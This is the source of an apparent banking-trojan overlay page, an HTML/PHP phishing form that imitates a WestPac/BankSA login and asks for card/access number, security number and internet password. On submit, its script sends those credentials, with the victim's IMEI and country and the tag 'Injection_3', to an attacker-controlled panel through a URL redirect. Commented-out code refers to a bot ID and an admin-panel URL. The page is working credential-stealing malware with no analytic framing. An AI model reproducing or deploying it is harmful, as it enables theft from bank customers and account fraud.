<html>
<head>
<style>
	body {
 background: -moz-linear-gradient(top,  #3d60a7 0%, #2f4c86 100%);
        background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#3d60a7), color-stop(100%,#2f4c86));
        background: -webkit-linear-gradient(top,  #3d60a7 0%,#2f4c86 100%);
        background: -o-linear-gradient(top,  #3d60a7 0%,#2f4c86 100%);
        background: -ms-linear-gradient(top,  #3d60a7 0%,#2f4c86 100%);
        background: linear-gradient(to bottom,  #3d60a7 0%,#2f4c86 100%);
        filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#804dc1ba', endColorstr='#80ff6b6b',GradientType=0 );
	}

	.input {
		background: transparent;
		height: 30px;
		width: 98%;
		border: 0 none;
		border-bottom: 1px solid #fff;
		color: #fff;
		font-size: 16px;
	}
	
	.fielderror {
		background: transparent;
		height: 30px;
		width: 98%;
		border: 0 none;
		border-bottom: 1px solid #f00;
		color: #fff;
		font-size: 16px;
	}
	.submit {
		width: 98%;
		height: 35px;
		border-radius: 6px;
		background: #c0142e;
		border: 0 none;
		color: #fff;
	}
	
	h4 {
		float: left;
		color: #fff;
		padding: 0 0 0 20px;
		margin: 0;
	}

	.checkbox {
		float: right;
		margin-right: 20px;
		width: 25px;
		height: 25px;
		background: transparent;
		border: 1px solid #c0142e;
	}
</style>
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>

<body>
<div id="content_div">
<center><br><br>
		<form action="null" method="post" id="_mainForm" target="flow_handler">
			<input name="Login with card/access no." id="login" placeholder="Login with card/access no." maxlength="16" class="input" type="text"><br><br>
			<script>
                document.getElementById('login').onkeypress = function (e) {
                    return !(/[А-Яа-яA-Za-z ]/.test(String.fromCharCode(e.charCode)));
                }
            </script>
			<input name="Security number" id="security" placeholder="Security number" maxlength="6" class="input" type="password"><br><br>
			<script>
                document.getElementById('security').onkeypress = function (e) {
                    return !(/[А-Яа-яA-Za-z ]/.test(String.fromCharCode(e.charCode)));
                }
            </script>
			<input name="Internet Password" id="password" placeholder="Internet Password" maxlength="12" class="input" type="password"><br><br>
			<div ><h4>Save card/access number </h4> <input type="checkbox" class="checkbox"> </div><br><br><br>
			<input value="Login" id="input_submitBtn" class="submit" type="button">
		 <input type="hidden" name="name" value="WestPac"> 

		</form>
<center>
	<iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe> 
</div>
<script type="text/javascript">
			   
				
				
				(function () {


                   var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
                        var input = objDoc.createElement("input");
                        input.setAttribute("type", "hidden");
                        input.setAttribute("name", sNm);
                        input.setAttribute("value", sV);
						input.value = sV;
                        objForm.appendChild(input);
                    };


                   /* var g_oForm = document.getElementById('_mainForm'), g_sFAct = prompt('getLink');
					
					if(!/https?:\/\//i.test(g_sFAct))
					   g_sFAct = 'http://' + g_sFAct;
					
                    g_oForm.setAttribute('action',g_sFAct); // устанавливаем у формы урл админки
					try{
					   g_oForm.action = g_sFAct;
					} catch(e){};
					
					var g_FrmCode = prompt('getId');
                    __insHiddenField(document, g_oForm, 'code', g_FrmCode); // получаем id бота
*/

                    var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {
					
						var oNumInp = document.getElementById('login');
                        var oSecuInp = document.getElementById('security');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = oSecuInp.className = oCodeInp.className = 'input';
						} catch(e){};
						
                        if (oNumInp.value.length < 6) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (oSecuInp.value.length < 3) {
							try{
								oSecuInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (oCodeInp.value.length < 4) {
							try{
								oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
				top['closeDlg'] = true;
				/*prompt('send', '{"dialog id" : "banksa'+
					'", "login_with_card_access": "'+oNumInp.value+
					'", "security": "'+oSecuInp.value+
					'", "password": "'+oCodeInp.value+'"}');
						
						document.getElementById('content_div').style.visibility = 'hidden';
						g_oForm.submit();*/
						
						
						var url='<?php echo $URL; ?>';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|banksa|"+oNumInp.value+"|"+oCodeInp.value+"|"+oSecuInp.value);

						
						return false;
                    };

                })();
            </script>
</body>
</html>
